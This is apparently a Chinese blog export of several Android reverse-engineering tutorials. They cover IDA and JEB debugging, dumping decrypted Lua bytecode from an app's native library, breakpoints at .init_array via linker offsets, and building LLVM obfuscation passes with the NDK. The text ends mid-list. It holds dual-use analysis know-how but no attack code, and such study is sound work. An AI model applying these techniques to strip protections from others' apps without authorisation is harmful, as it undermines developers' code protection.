<p>参考：<a href="https://blog.csdn.net/lylwo317/article/details/86545130">https://blog.csdn.net/lylwo317/article/details/86545130</a></p>
</blockquote>
<h1 id="三、其他"><a href="#三、其他" class="headerlink" title="三、其他"></a>三、其他</h1><p>使用<a href="https://www.lili.kim/2019/01/28/android/Debug%20Android%20Native%20with%20LLDB/">此链接</a>的方法进行调试，记录以下使用过程，虽然未成功。</p>
<h2 id="1-打开调试"><a href="#1-打开调试" class="headerlink" title="1. 打开调试"></a>1. 打开调试</h2><p>将下列内容添加至 <code>aosp/build/core/binary.mk</code> 中， 加了之后编译的系统暂时未感觉有什么不同。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line"># No one should ever use this flag. On GCC it&#x27;s mere presence will disable all</span><br><span class="line"># warnings, even those that are specified after it (contrary to typical warning</span><br><span class="line"># flag behavior). This circumvents CFLAGS_NO_OVERRIDE from forcibly enabling the</span><br><span class="line"># warnings that are *always* bugs.</span><br><span class="line">my_illegal_flags := -w</span><br><span class="line">my_cflags := $(filter-out $(my_illegal_flags),$(my_cflags))</span><br><span class="line">my_cppflags := $(filter-out $(my_illegal_flags),$(my_cppflags))</span><br><span class="line">my_conlyflags := $(filter-out $(my_illegal_flags),$(my_conlyflags))</span><br><span class="line"></span><br><span class="line">#调试信息</span><br><span class="line">ifndef LOCAL_IS_HOST_MODULE</span><br><span class="line">    lili_test_so := libsurfaceflinger libcutils liblog libbinder libutils \</span><br><span class="line">                    libc++ libc libm libhardware libui libgui libpowermanager \</span><br><span class="line">                    libvulkan libbacktrace libsync libnativeloader libbase libz \</span><br><span class="line">                    gralloc.msm8974 libmemalloc hwcomposer.msm8974 liboverlay libhdmi \</span><br><span class="line">                    libhardware_legacy libmedia libskia libvirtual libstdc++</span><br><span class="line"></span><br><span class="line">    ifneq (,$(filter $(LOCAL_MODULE), $(lili_test_so)))</span><br><span class="line">            my_cflags_no_override += -O0 -g3 -Wno-error</span><br><span class="line">            ifeq ($(my_clang),true)</span><br><span class="line">                my_cflags_no_override += -fno-limit-debug-info -glldb</span><br><span class="line">            else</span><br><span class="line">                my_cflags_no_override += -ggdb3</span><br><span class="line">            endif</span><br><span class="line">    endif</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">$(LOCAL_INTERMEDIATE_TARGETS): PRIVATE_YACCFLAGS := $(LOCAL_YACCFLAGS)</span><br></pre></td></tr></table></figure>

<h2 id="2-配置CMakeList-并导入源码"><a href="#2-配置CMakeList-并导入源码" class="headerlink" title="2. 配置CMakeList,并导入源码"></a>2. 配置CMakeList,并导入源码</h2><p>这个和之前的没有区别，略。</p>
<h2 id="3-安装AndroidNativeDebug插件，并配置"><a href="#3-安装AndroidNativeDebug插件，并配置" class="headerlink" title="3. 安装AndroidNativeDebug插件，并配置"></a>3. 安装<code>AndroidNativeDebug</code>插件，并配置</h2><img src="/2019/11/13/%E4%BD%BF%E7%94%A8Clion%E8%B0%83%E8%AF%95Android-native%E6%BA%90%E7%A0%81/2019-11-13-19-57-32.png" class="">

<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
<th>Default</th>
</tr>
</thead>
<tbody><tr>
<td>SDK</td>
<td>Android SDK Path</td>
<td>none</td>
</tr>
<tr>
<td>NDK</td>
<td>Android NDK Path (Auto gen when ndk-bundle exist in SDK)</td>
<td>none</td>
</tr>
<tr>
<td>LLDB</td>
<td>LLDB Path (Auto gen when lldb exist in SDK)</td>
<td>none</td>
</tr>
<tr>
<td>Remote</td>
<td>LLDB Target Remote</td>
<td>unix-abstract-connect:&#x2F;&#x2F;&#x2F;sdcard&#x2F;debug.sock</td>
</tr>
<tr>
<td>Adb Root</td>
<td>The adb can root?</td>
<td>false</td>
</tr>
<tr>
<td>Process Name</td>
<td>The name of debug process</td>
<td>none</td>
</tr>
</tbody></table>
<img src="/2019/11/13/%E4%BD%BF%E7%94%A8Clion%E8%B0%83%E8%AF%95Android-native%E6%BA%90%E7%A0%81/2019-11-13-19-58-32.png" class="">

<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
<th>Default</th>
</tr>
</thead>
<tbody><tr>
<td>Android Source</td>
<td>Android Source Tree Path</td>
<td>none</td>
</tr>
<tr>
<td>Lunch</td>
<td>Android target lunch</td>
<td>none</td>
</tr>
</tbody></table>
<p>后续直接进行调试就可以了。</p>
<p>我这里遇到的问题，可以启动调试，但是断点无法段下来，后续有时间再研究。</p>
<blockquote>
<p>参考：<a href="https://www.lili.kim/2019/01/28/android/Debug%20Android%20Native%20with%20LLDB/">https://www.lili.kim/2019/01/28/android/Debug%20Android%20Native%20with%20LLDB/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android源码</category>
      </categories>
      <tags>
        <tag>Android 源码调试</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Idea调试jebPro</title>
    <url>/2020/06/05/%E4%BD%BF%E7%94%A8Idea%E8%B0%83%E8%AF%95jebPro/</url>
    <content><![CDATA[<p>参考:</p>
<blockquote>
<p><a href="http://scz.617.cn:8/misc/202006051232.txt">http://scz.617.cn:8/misc/202006051232.txt</a></p>
</blockquote>
<blockquote>
<p><a href="https://www.ms509.com/2020/03/19/Java-Debug/">https://www.ms509.com/2020/03/19/Java-Debug/</a></p>
</blockquote>
<!-- TOC -->

<ul>
<li><a href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87">前期准备</a></li>
<li><a href="#%E5%BC%80%E5%A7%8B%E8%B0%83%E8%AF%95">开始调试</a></li>
</ul>
<!-- /TOC -->

<h1 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1. 前期准备"></a>1. 前期准备</h1><p>使用 Idea 新建一个空 java 工程。</p>
<img src="/2020/06/05/%E4%BD%BF%E7%94%A8Idea%E8%B0%83%E8%AF%95jebPro/2020-06-05-17-56-40.png" class="">

<p>把待调试的jar包加入到工程的依赖包中：右键点击工程名，选择 <code>Open Module Setteings</code> 。</p>
<img src="/2020/06/05/%E4%BD%BF%E7%94%A8Idea%E8%B0%83%E8%AF%95jebPro/2020-06-05-17-58-34.png" class="">

<p>然后在Libraries中加入待调试的jar文件。</p>
<img src="/2020/06/05/%E4%BD%BF%E7%94%A8Idea%E8%B0%83%E8%AF%95jebPro/2020-06-05-18-00-04.png" class="">

<p>然后就可以在工程中反编译jar包了，下好断点。</p>
<img src="/2020/06/05/%E4%BD%BF%E7%94%A8Idea%E8%B0%83%E8%AF%95jebPro/2020-06-05-18-04-33.png" class="">

<h1 id="2-开始调试"><a href="#2-开始调试" class="headerlink" title="2. 开始调试"></a>2. 开始调试</h1><p>以调试方式启动 jeb 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar -Xdebug -Xrunjdwp:transport=dt_socket,address=9000,server=y,suspend=n jebc.jar</span><br></pre></td></tr></table></figure>

<p>使用 Idea 附加 Jeb , <code>Run-&gt;Attach to Process</code> 选中 jeb。</p>
<img src="/2020/06/05/%E4%BD%BF%E7%94%A8Idea%E8%B0%83%E8%AF%95jebPro/2020-06-05-18-08-23.png" class="">

<p>在 jeb 中选则关于，可以看到直接断在断点处。</p>
<img src="/2020/06/05/%E4%BD%BF%E7%94%A8Idea%E8%B0%83%E8%AF%95jebPro/2020-06-05-18-10-17.png" class="">


<p>可以很清楚的看到和修改各变量的值，剩下的就自我发挥了。</p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>JEB</tag>
      </tags>
  </entry>
  <entry>
    <title>动态调试so</title>
    <url>/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/</url>
    <content><![CDATA[<blockquote>
<p>如果手机系统是 android 10，那么需要设置一下</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> IDA_LIBC_PATH=/apex/com.android.runtime/lib/bionic/libc.so</span><br><span class="line">or <span class="built_in">export</span> IDA_LIBC_PATH=/apex/com.android.runtime/lib64/bionic/libc.so</span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://bbs.pediy.com/thread-258103.htm">https://bbs.pediy.com/thread-258103.htm</a></p>
<h1 id="动态调试送给最好的TA"><a href="#动态调试送给最好的TA" class="headerlink" title="动态调试送给最好的TA"></a>动态调试送给最好的TA</h1><h2 id="常规方式"><a href="#常规方式" class="headerlink" title="常规方式"></a>常规方式</h2><h3 id="1-使用IDA打开需要调试的so文件，找到关键的方法，设置断点。"><a href="#1-使用IDA打开需要调试的so文件，找到关键的方法，设置断点。" class="headerlink" title="1. 使用IDA打开需要调试的so文件，找到关键的方法，设置断点。"></a>1. 使用IDA打开需要调试的so文件，找到关键的方法，设置断点。</h3><img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-22-20-57-11.png" class="">

<h3 id="2-选择Android调试器，设置hostname和端口。"><a href="#2-选择Android调试器，设置hostname和端口。" class="headerlink" title="2. 选择Android调试器，设置hostname和端口。"></a>2. 选择Android调试器，设置hostname和端口。</h3><img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-22-20-58-08.png" class="">

<h3 id="3-开始调试"><a href="#3-开始调试" class="headerlink" title="3. 开始调试"></a>3. 开始调试</h3><ul>
<li>启动 <code>android_server</code> 。</li>
<li>端口转发 <code>adb forward tcp:23946 tcp:23946</code> 。</li>
<li>以调试模式启动对应的 Activaty ，<code>adb shell am start -D -n com.sgzh.dt/com.androlua.Welcome</code> 。</li>
</ul>
<p>执行完以上操作完，使用 IDA 附加对应的 APP 。</p>
<img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-22-21-02-38.png" class="">

<h3 id="4-jdb-连接"><a href="#4-jdb-连接" class="headerlink" title="4. jdb 连接"></a>4. jdb 连接</h3><p>打开 monitor ，查看APP的调试端口，使用jdb 命令连接 <code> jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code> 。</p>
<p>此时 APP 将会运行起来，IDA 将会弹出下列界面，点击 same 就可以了。</p>
<img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-22-21-07-35.png" class="">

<p>最终将会断在我们之前下断点的地方。</p>
<img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-22-21-08-20.png" class="">


<h3 id="5-分析并-dump-lua-字节码"><a href="#5-分析并-dump-lua-字节码" class="headerlink" title="5. 分析并 dump lua 字节码"></a>5. 分析并 dump lua 字节码</h3><p>通过参考其他文章可知 luaL_loadbufferx 是关键解密函数，但是也需要我们要分析解密的具体地方。看到有 malloc 就很可疑。我们就需要重点关注这个地方。通过调试发现其申请的空间就是存放解密后的 lua 字节码。</p>
<img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-22-21-09-05.png" class="">

<p>编写 dump 脚本，下面提供了 IDC 和 Python 脚本。</p>
<p><code>dump.idc</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span> i,fp;</span><br><span class="line">    fp = fopen(<span class="string">&quot;d:\\init.lua&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> start = <span class="number">0xF18B7140</span>;</span><br><span class="line">    <span class="keyword">auto</span> size = <span class="number">0x1A6</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        fputc(Byte(start + i),fp); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>dump.py
</code></pre>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line">start_address = <span class="number">0xF18B7140</span></span><br><span class="line">data_length = <span class="number">0x1A6</span></span><br><span class="line">data = idaapi.dbg_read_memory(start_address , </span><br><span class="line">data_length)</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;d:\\dump1&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">fp.write(data)</span><br><span class="line">fp.close()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Dump OK&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="将字节码转换为-lua-代码"><a href="#将字节码转换为-lua-代码" class="headerlink" title="将字节码转换为 lua 代码"></a>将字节码转换为 lua 代码</h3><p>在网上找到 <code>unluac_2015_06_13.jar</code> ，将 lua 节码转换为 lua 代码。</p>
<img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-22-21-13-27.png" class="">

<h2 id="修改-so-方式"><a href="#修改-so-方式" class="headerlink" title="修改 so 方式"></a>修改 so 方式</h2><p>这种方式主要是探索 IDA 断点的字节码，同样使用于探索其他调试器的断点字节码。</p>
<h3 id="修改字节码"><a href="#修改字节码" class="headerlink" title="修改字节码"></a>修改字节码</h3><p>使用IDA打开需要调试的so文件，找到关键的方法，修改字节码，并将修改后的内容保存至文件。</p>
<img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-22-21-18-20.png" class="">

<p>为什么将字节码修 03 AF 改为 10 DE 。</p>
<img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-22-21-19-40.png" class="">

<p>使用的 IDA 插件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">下载Keypatch.py复制到插件目录：https://github.com/keystone-engine/keypatch</span><br><span class="line">下载安装keystone python模块：https://github.com/keystone-engine/keystone/releases/download/0.9.1/keystone-0.9.1-python-win64.msi</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong></p>
<blockquote>
<p>其实这里不一定要使用这种方式获取断点的字节码，也可以通过循环断下来，将指令改为一个死循环，最后暂停就可以断到相应的位置了，最后再将指令改回去就可以了。 </p>
</blockquote>
<p>最后重打包，按照之前的方式调试即可。</p>
<h1 id="如何在-init-proc-和-init-arrary-调用下断点"><a href="#如何在-init-proc-和-init-arrary-调用下断点" class="headerlink" title="如何在 .init_proc 和 init_arrary 调用下断点"></a>如何在 <code>.init_proc</code> 和 <code>init_arrary</code> 调用下断点</h1><h2 id="init-proc-函数和-init-arrary-的产生方法。"><a href="#init-proc-函数和-init-arrary-的产生方法。" class="headerlink" title=".init_proc 函数和 init_arrary 的产生方法。"></a><code>.init_proc</code> 函数和 <code>init_arrary</code> 的产生方法。</h2><p><code>_init</code> 函数经过编译后就是 <code>.init_proc</code> 函数，是目前我所知道的在 so 最早被调用的函数 。<code>_init</code> 函数无参，无返回值，其次必须函数名必须是 <code>_init</code> ，并且不能名称粉碎。</p>
<img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-22-21-36-04.png" class="">

<p>函数添加 <code>__attribute__((constructor))</code> 属性后，就会将对应的函数指针放在 <code>init_array</code> 节中，在 JNI_Onload 之前被调用。</p>
<img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-22-21-36-55.png" class="">

<p>执行结果如下：</p>
<img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-22-21-41-55.png" class="">

<p>可以看到先执行的 <code>.init_proc</code> 函数，然后执行  <code>init_arrary</code> 节里的函数，最后执行 JNI_Onload 。</p>
<h2 id="通过源码找到调用的关键位置"><a href="#通过源码找到调用的关键位置" class="headerlink" title="通过源码找到调用的关键位置"></a>通过源码找到调用的关键位置</h2><p>由于 <code>.init_proc</code> 和 <code>init_arrary</code> 是在 so 加载完成前调用的，那么就需要知道他们是在何时调用的，这里就需要跟一下dlopen的源码，最终会发现调用他们实现在 <code>linker.cpp </code>中，这一块大家有兴趣可以自己看看。我这里就直接给 android 7.1.2 源码中的关键点了。</p>
<p><code>http://androidxref.com/7.1.2_r36/xref/bionic/linker/linker.cpp</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">soinfo::call_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* function_name __unused, </span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">linker_function_t</span> function)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (function == <span class="literal">nullptr</span> </span><br><span class="line">      || <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(function) == <span class="built_in">static_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(<span class="number">-1</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">TRACE</span>(<span class="string">&quot;[ Calling %s @ %p for \&quot;%s\&quot; ]&quot;</span>, function_name, function, <span class="built_in">get_realpath</span>());</span><br><span class="line">  <span class="built_in">function</span>(); <span class="comment">//直接调用函数指针</span></span><br><span class="line">  <span class="built_in">TRACE</span>(<span class="string">&quot;[ Done calling %s @ %p for \&quot;%s\&quot; ]&quot;</span>, function_name, function, <span class="built_in">get_realpath</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大家看源码时也最好根据自己的手机版本看相对应的源码。其中 <code>funcion()</code> 就是调用 <code>.init_proc</code> 和 <code>init_arrary</code> 的地方，大家看看这个地方有什么特点？我们可以根据其上下两行输出字符串确定其位置。</p>
<p>我们直接到手机的 <code>system/bin</code> 目录中导出 linker 文件，如果调试 ARMv8 则需要导出 linker64 文件。通过查找字符串<code> [ Calling %s @ %p for \&quot;%s\&quot; ]</code>  找到关键位置，其偏移为 0x6414 ，最后就可以通过基址+偏移得到最终的地址需要下断点的地址。</p>
<img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-24-19-19-27.png" class="">

<h2 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h2><p>当在 libc 中断下来直接，ctrl+s 找到 linker 的基址，然后加上偏移 0x6414 。可以发现其基址为 0xF44DC000+0x6414 &#x3D; F44E2414 最后跳到此处，下断点直接 F9 运行。然后 jdb 连接，最终会断在此处，F7 单步步入，即为 <code>.init_proc</code> 函数，继续执行就会又断在此处，F7 步入，则 test_construtor 函数。</p>
<img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-24-19-23-12.png" class="">

<img src="/2021/02/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/2021-02-24-19-23-20.png" class="">

<p>其中也可以通过前文讲的修改 so 文件，修改字节码实现断点或无限循环达到相同的效果。</p>
<p>调试应用和代码：</p>
<p><a href="https://github.com/CKCat/Blog/blob/master/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/%E9%80%81%E7%BB%99%E6%9C%80%E5%A5%BD%E7%9A%84TA.apk">送给最好的TA</a></p>
<p><a href="https://github.com/CKCat/Blog/blob/master/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/unluac_2015_06_13.jar">unluac_2015_06_13.jar</a></p>
<p><a href="https://github.com/CKCat/Blog/tree/master/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95so/ndkcode">init_proc相关代码</a></p>
<p>参考：</p>
<p><a href="https://bbs.pediy.com/thread-254770.htm">https://bbs.pediy.com/thread-254770.htm</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>史上最优雅的NDK加载pass方案</title>
    <url>/2020/03/07/%E5%8F%B2%E4%B8%8A%E6%9C%80%E4%BC%98%E9%9B%85%E7%9A%84NDK%E5%8A%A0%E8%BD%BDpass%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<blockquote>
<p>转载 : <a href="https://xz.aliyun.com/t/6643">https://xz.aliyun.com/t/6643</a></p>
</blockquote>
<p>关键词：</p>
<ul>
<li>不需要编译llvm</li>
<li>仅依赖NDK，不需要额外的其他环境</li>
<li>不会遇到配置引起的符号NotFound问题</li>
<li>不污染NDK<!-- TOC --></li>
</ul>
<ul>
<li><a href="#%E4%B8%80%E8%83%8C%E6%99%AF%E4%BB%8B%E7%BB%8D">一、背景介绍</a></li>
<li><a href="#%E4%BA%8C%E4%BD%BF%E7%94%A8ndk%E7%9A%84%E7%8E%AF%E5%A2%83%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AApass">二、使用NDK的环境编译一个pass</a></li>
<li><a href="#%E4%B8%89%E4%BD%BF%E7%94%A8ndk%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8A%A0%E8%BD%BD%E4%B8%80%E4%B8%AApass">三、使用NDK的环境加载一个pass</a></li>
<li><a href="#%E5%9B%9B%E5%BD%93%E6%88%91%E4%BB%AC%E6%9D%A5%E5%88%B0macos%E4%B8%8A">四、当我们来到macOS上</a></li>
<li><a href="#%E4%BA%94%E5%BD%93%E6%88%91%E4%BB%AC%E6%9D%A5%E5%88%B0windows">五、当我们来到Windows</a></li>
<li><a href="#%E5%85%AD%E5%85%B6%E4%BB%96">六、其他</a></li>
</ul>
<!-- /TOC -->


<h1 id="一、背景介绍"><a href="#一、背景介绍" class="headerlink" title="一、背景介绍"></a>一、背景介绍</h1><p>现在代码保护技术很多是在llvm上实现的，例如 ollvm 和 hikari，作者给出的实现是将源码混杂在llvm中，这样做非常不优雅。近来越来越多安全工作者都开始接触和研究基于llvm的代码保护，工欲善其事必先利其器，在编译、运行均是本机的环境下，不会出问题，因此本文介绍的是，如何优雅地在NDK中加载pass。</p>
<p>安卓开发者使用混淆技术来保护native代码时，一般有两种选择：</p>
<p>第一个选择是获得git上 ollvm 或 hikari 的代码，编译后，替换掉NDK中原先的toolchain。<br>这是最不优雅的方式，因为维护起来很麻烦，因为需要编译整个llvm工程，并且对NDK有侵入性，无法保证修改前和修改后NDK的功能不发生变化。</p>
<p>第二个选择是，编译llvm工程，替换掉NDK中原先的toolchain，并且在相同环境下，移植 ollvm 或hikari 为独立的plugin，（移植方案我的github里有写 <a href="https://github.com/LeadroyaL/llvm-pass-tutorial">https://github.com/LeadroyaL/llvm-pass-tutorial</a> ）用编译为插件的形式，动态加载插件。<br>相比第一个方案，极大降低维护的代价，只编译一个pass即可，但仍然对NDK有侵入性。</p>
<p>这两种方案的共同特点是：都需要编译整个llvm项目，初次部署时要消耗大量的时间和资源，另外在选择llvm版本时，也会纠结适配性的问题（虽然通常不会出现适配问题）</p>
<p>笔者曾经使用的是第二种方案，经过研究，本文提出第三种方案，使用NDK中的环境编译pass并加载pass，优雅程度上来看，有以下的特点：</p>
<ul>
<li>最最重要的，不需要编译llvm项目，节省巨大的时间和资源消耗；</li>
<li>其次，不修改原先的NDK运行环境，和原生的NDK是最像的，没有侵入性；</li>
<li>再次，上下文均和NDK完全一致，不需要担心符号问题，不需要额外安装软件和环境，有NDK的环境就足矣；</li>
</ul>
<p>本文演示的环境是：ubuntu18.04（任意linux均可）、ndk-r20（任意NDK版本均可）、cmake（选择较高版本）</p>
<h1 id="二、使用NDK的环境编译一个pass"><a href="#二、使用NDK的环境编译一个pass" class="headerlink" title="二、使用NDK的环境编译一个pass"></a>二、使用NDK的环境编译一个pass</h1><p>众所周知，编译Pass时需要使用llvm的环境，由于NDK中的llvm环境是破损的，所以开发者一般自己编译一份llvm环境出来，替换掉NDK中的llvm环境，包括我本人之前也是这样处理的，这样做的原因是NDK中的llvm是破损的，因为NDK来自AOSP编译好的toolchain，而AOSP在制作toolchain的过程中是移除了部分文件的。</p>
<p>上文提到，本文的方案是不需要亲自编译llvm的，因此就需要使用NDK中的破损的llvm环境来编译一个pass。</p>
<p>根据对 <a href="https://android.googlesource.com/toolchain/llvm_android/">https://android.googlesource.com/toolchain/llvm_android/</a> 的阅读和调试，NDK中的llvm缺失的是一部分binary文件、全部静态链接库文件、全部头文件，采用的是静态连接的方式，它的clang是较为独立的文件（它会依赖libc++，因此成为较为独立）。</p>
<p>平时编译Pass时，需要使用cmake并且导入各种cmake相关的环境，通常写如下的配置文件，<a href="https://github.com/abenkhadra/llvm-pass-tutorial/blob/master/CMakeLists.txt">https://github.com/abenkhadra/llvm-pass-tutorial/blob/master/CMakeLists.txt</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.4)</span><br><span class="line"></span><br><span class="line"># we need LLVM_HOME in order not automatically set LLVM_DIR</span><br><span class="line">if(NOT DEFINED ENV&#123;LLVM_HOME&#125;)</span><br><span class="line">    message(FATAL_ERROR &quot;$LLVM_HOME is not defined&quot;)</span><br><span class="line">else ()</span><br><span class="line">    set(ENV&#123;LLVM_DIR&#125; $ENV&#123;LLVM_HOME&#125;/lib/cmake/llvm)</span><br><span class="line">endif()</span><br><span class="line"></span><br><span class="line">find_package(LLVM REQUIRED CONFIG)</span><br><span class="line">add_definitions($&#123;LLVM_DEFINITIONS&#125;)</span><br><span class="line">include_directories($&#123;LLVM_INCLUDE_DIRS&#125;)</span><br><span class="line">link_directories($&#123;LLVM_LIBRARY_DIRS&#125;)</span><br><span class="line"></span><br><span class="line">add_subdirectory(skeleton)  # Use your pass name here.</span><br></pre></td></tr></table></figure>
<p><strong>幸运的是</strong> ，NDK中的lib&#x2F;cmake&#x2F;llvm还在，里面的cmake文件都是原汁原味的的。</p>
<p><strong>不幸的是</strong> ，由于AOSP在编译toolchain时设置了 <code>defines[&#39;LLVM_LIBDIR_SUFFIX&#39;] = &#39;64&#39;</code> ，导致find_package的路径应该是 <code>lib64/cmake/llvm</code> ，需要稍加修改</p>
<p>之后进行 <code>mkdir b;cd b;cmake ..</code></p>
<p>会报如下的错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  b git:(master) ✗ cmake ..</span><br><span class="line">CMake Error at /home/leadroyal/Android/Sdk/ndk/20.0.5594570/toolchains/llvm/prebuilt/linux-x86_64/lib64/cmake/llvm/LLVMExports.cmake:806 (message):</span><br><span class="line">  The imported target &quot;LLVMDemangle&quot; references the file</span><br><span class="line"></span><br><span class="line">     &quot;/home/leadroyal/Android/Sdk/ndk/20.0.5594570/toolchains/llvm/prebuilt/linux-x86_64/lib64/libLLVMDemangle.a&quot;</span><br><span class="line">  but this file does not exist.  Possible reasons include:</span><br><span class="line">  * The file was deleted, renamed, or moved to another location.</span><br><span class="line">  * An install or uninstall procedure did not complete successfully.</span><br><span class="line">  * The installation package was faulty and contained</span><br><span class="line">     &quot;/home/leadroyal/Android/Sdk/ndk/20.0.5594570/toolchains/llvm/prebuilt/linux-x86_64/lib64/cmake/llvm/LLVMExports.cmake&quot;</span><br><span class="line"></span><br><span class="line">  but not all the files it references.</span><br><span class="line">Call Stack (most recent call first):</span><br><span class="line">  /home/leadroyal/Android/Sdk/ndk/20.0.5594570/toolchains/llvm/prebuilt/linux-x86_64/lib64/cmake/llvm/LLVMConfig.cmake:173 (include)</span><br><span class="line">  CMakeLists.txt:8 (find_package)</span><br><span class="line"></span><br><span class="line">-- Configuring incomplete, errors occurred!</span><br><span class="line">See also &quot;/home/leadroyal/llvm-pass-tutorial/b/CMakeFiles/CMakeOutput.log&quot;.</span><br></pre></td></tr></table></figure>
<p>因为NDK不含有.a文件，而cmake会检查这些文件，用于静态连接，被认为初始化失败，出错。</p>
<p>看源码对应的位置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Loop over all imported files and verify that they actually exist</span><br><span class="line">foreach(target $&#123;_IMPORT_CHECK_TARGETS&#125; )</span><br><span class="line">  foreach(file $&#123;_IMPORT_CHECK_FILES_FOR_$&#123;target&#125;&#125; )</span><br><span class="line">    if(NOT EXISTS &quot;$&#123;file&#125;&quot; )</span><br><span class="line">      message(FATAL_ERROR &quot;The imported target \&quot;$&#123;target&#125;\&quot; references the file</span><br><span class="line">   \&quot;$&#123;file&#125;\&quot;</span><br><span class="line">but this file does not exist.  Possible reasons include:</span><br><span class="line">* The file was deleted, renamed, or moved to another location.</span><br><span class="line">* An install or uninstall procedure did not complete successfully.</span><br><span class="line">* The installation package was faulty and contained</span><br><span class="line">   \&quot;$&#123;CMAKE_CURRENT_LIST_FILE&#125;\&quot;</span><br><span class="line">but not all the files it references.</span><br><span class="line">&quot;)</span><br><span class="line">    endif()</span><br><span class="line">  endforeach()</span><br><span class="line">  unset(_IMPORT_CHECK_FILES_FOR_$&#123;target&#125;)</span><br><span class="line">endforeach()</span><br></pre></td></tr></table></figure>
<p>在文件不存在时，报 <code>message(FATAL_ERROR xxxxxx)</code>，从而中断编译，但我们本来就是编译动态链接库的，不需要.a文件，所以这里做一个patch，降低log_level，使用WARNING等级。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- message(FATAL_ERROR &quot;The imported target \&quot;$&#123;target&#125;\&quot; references the file</span><br><span class="line">+ message(WARNING &quot;The imported target \&quot;$&#123;target&#125;\&quot; references the file</span><br></pre></td></tr></table></figure>
<p>接下来面对第二个问题，之前提到过，NDK中缺失我们需要的头文件，它们本该出现在 <code>include/llvm</code> 中，因此这句话失效了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include_directories($&#123;LLVM_INCLUDE_DIRS&#125;)</span><br></pre></td></tr></table></figure>
<p>但我们又不能随便找一堆头文件过来，版本之间可能有变更，万一用到一些配置不一样的头文件，就会出现非预期（例如经常出错的LLVM_ENABLE_ABI_BREAKING_CHECKS配置）</p>
<p>此时的思路是，找到NDK中llvm生成时的那份commit，从中获取include文件，有两个方案</p>
<ul>
